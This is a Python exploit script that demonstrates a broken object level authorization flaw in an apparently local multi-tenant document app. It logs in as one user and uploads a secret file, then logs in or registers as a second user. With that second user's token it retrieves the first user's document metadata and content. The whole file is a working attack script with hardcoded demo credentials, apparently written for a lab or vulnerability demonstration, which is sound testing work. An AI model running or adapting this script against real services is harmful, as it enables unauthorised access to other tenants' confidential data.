#!/usr/bin/env python3

import requests
import json
import io

BASE_URL = "http://localhost:5000"

def exploit_bola():
    print("[+] BOLA (Broken Object Level Authorization) Exploit")
    print("[+] This demonstrates accessing other users' documents")
    
    # Login as first user
    user1_data = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    print("\n[1] Logging in as User 1...")
    response1 = requests.post(f"{BASE_URL}/api/auth/login", json=user1_data)
    if response1.status_code != 200:
        print("[-] User 1 login failed")
        return False
    
    user1_token = response1.json()["token"]
    user1_headers = {"Authorization": f"Bearer {user1_token}"}
    print(f"[+] User 1 logged in: {user1_data['email']}")
    
    # Create a document as User 1
    print("\n[2] Creating document as User 1...")
    test_file = io.BytesIO(b"Secret document content from User 1")
    files = {'file': ('secret.txt', test_file, 'text/plain')}
    data = {'title': 'User 1 Secret Document', 'description': 'Confidential data'}
    
    upload_response = requests.post(
        f"{BASE_URL}/api/documents/upload",
        headers=user1_headers,
        files=files,
        data=data
    )
    
    if upload_response.status_code != 201:
        print("[-] Failed to create document")
        return False
    
    document_id = upload_response.json()['document']['_id']
    print(f"[+] Document created with ID: {document_id}")
    
    # Login as second user
    user2_data = {
        "email": "test@tenantguard.com",
        "password": "test123"
    }
    
    print("\n[3] Logging in as User 2...")
    response2 = requests.post(f"{BASE_URL}/api/auth/login", json=user2_data)
    if response2.status_code != 200:
        print("[-] User 2 login failed, trying to register...")
        
        # Register User 2 if doesn't exist
        register_data = {
            "email": "test@tenantguard.com",
            "password": "test123",
            "tenantName": "TestTenant",
            "fullName": "Test User"
        }
        
        reg_response = requests.post(f"{BASE_URL}/api/auth/register", json=register_data)
        if reg_response.status_code == 201:
            user2_token = reg_response.json()["token"]
            print("[+] User 2 registered and logged in")
        else:
            print("[-] Failed to register User 2")
            return False
    else:
        user2_token = response2.json()["token"]
        print(f"[+] User 2 logged in: {user2_data['email']}")
    
    user2_headers = {"Authorization": f"Bearer {user2_token}"}
    
    # Try to access User 1's document with User 2's token (BOLA)
    print("\n[4] Attempting BOLA attack...")
    print(f"[+] User 2 trying to access User 1's document: {document_id}")
    
    bola_response = requests.get(
        f"{BASE_URL}/api/documents/{document_id}",
        headers=user2_headers
    )
    
    if bola_response.status_code == 200:
        doc_data = bola_response.json()
        print("\nðŸš¨ BOLA VULNERABILITY CONFIRMED! ðŸš¨")
        print("[+] User 2 successfully accessed User 1's document!")
        print(f"[+] Document Title: {doc_data.get('title')}")
        print(f"[+] Document Owner: {doc_data.get('userId')}")
        print(f"[+] Document Description: {doc_data.get('description')}")
        
        # Try to download the file content
        download_response = requests.get(
            f"{BASE_URL}/api/documents/{document_id}/view",
            headers=user2_headers
        )
        
        if download_response.status_code == 200:
            print("[+] User 2 can also view the document content!")
            content_data = download_response.json()
            print(f"[+] File content: {content_data.get('content', '')[:50]}...")
        
        return True
    else:
        print(f"[-] BOLA attack failed. Status: {bola_response.status_code}")
        print(f"[-] Response: {bola_response.text}")
        return False

if __name__ == "__main__":
    exploit_bola()